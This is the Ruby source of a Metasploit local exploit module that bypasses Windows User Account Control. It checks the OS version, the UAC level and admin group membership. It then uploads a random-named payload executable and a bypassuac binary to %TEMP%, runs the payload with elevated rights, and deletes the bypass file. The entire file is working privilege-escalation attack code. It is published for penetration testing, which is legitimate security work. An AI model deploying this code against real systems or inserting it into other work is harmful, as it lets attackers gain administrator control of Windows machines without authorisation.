##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate UAC Protection Bypass',
      'Description'   => %q{
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',
          'mitnick',
          'mubix' # Port to local exploit
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'References'    => [
        [ 'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/' ]
      ],
      'DisclosureDate'=> "Dec 31 2010"
    ))

  end

  def runas_method
    payload = generate_payload_exe
    payload_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
    tmpdir = expand_path("%TEMP%")
    tempexe = tmpdir + "\\" + payload_filename
    write_file(tempexe, payload)
    print_status("Uploading payload: #{tempexe}")
    session.railgun.shell32.ShellExecuteA(nil,"runas",tempexe,nil,nil,5)
    print_status("Payload executed")
  end

  def exploit
    fail_with(Exploit::Failure::None, 'Already in elevated state') if is_admin? or is_system?

    #
    # Verify use against Vista+
    #
    winver = sysinfo["OS"]
    if winver !~ /Windows Vista|Windows 2008|Windows [78]/
      fail_with(Exploit::Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status "UAC is Enabled, checking level..."
    else
      if is_in_admin_group?
        fail_with(Exploit::Failure::Unknown, "UAC is disabled and we are in the admin group so something has gone wrong...")
      else
        fail_with(Exploit::Failure::NoAccess, "Not in admins group, cannot escalate with this module")
      end
    end

    case get_uac_level
    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP, UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP, UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
      fail_with(Exploit::Failure::NotVulnerable,
        "UAC is set to 'Always Notify'\r\nThis module does not bypass this setting, exiting..."
      )
    when UAC_DEFAULT
      print_good "UAC is set to Default"
      print_good "BypassUAC can bypass this setting, continuing..."
    when UAC_NO_PROMPT
      print_warning "UAC set to DoNotPrompt - using ShellExecute 'runas' method instead"
      runas_method
      return
    end

    # Check if you are an admin
    print_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Exploit::Failure::NoAccess, "Not in admins group, cannot escalate with this module")
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Exploit::Failure::NoAccess, "Cannot BypassUAC from Low Integrity Level")
    end

    #
    # Generate payload and random names for upload
    #
    payload = generate_payload_exe

    # randomize the bypass_uac_filename
    bypass_uac_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    # randomize the payload exe name
    payload_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"

    # path to the bypassuac binary
    path = ::File.join(Msf::Config.data_directory, "post")

    # decide, x86 or x64
    bpexe = nil
    if sysinfo["Architecture"] =~ /x64/i
      bpexe = ::File.join(path, "bypassuac-x64.exe")
    else
      bpexe = ::File.join(path, "bypassuac-x86.exe")
    end

    tmpdir = expand_path("%TEMP%")
    cmd = "#{tmpdir}\\#{bypass_uac_filename} /c #{tmpdir}\\#{payload_filename}"

    print_status("Uploading the bypass UAC executable to the filesystem...")

    begin
      #
      # Upload UAC bypass to the filesystem
      #
      upload_file("#{tmpdir}\\#{bypass_uac_filename}", bpexe)
      print_status("Meterpreter stager executable #{payload.length} bytes long being uploaded..")
      #
      # Upload the payload to the filesystem
      #
      tempexe = tmpdir + "\\" + payload_filename
      write_file(tempexe, payload)
    rescue ::Exception => e
      print_error("Error uploading file #{bypass_uac_filename}: #{e.class} #{e}")
      return
    end

    print_status("Uploaded the agent to the filesystem....")

    # execute the payload
    cmd_exec(cmd)

    # delete the uac bypass payload
    delete_file = "#{tmpdir}\\#{bypass_uac_filename}"

    file_rm(delete_file)
  end
end

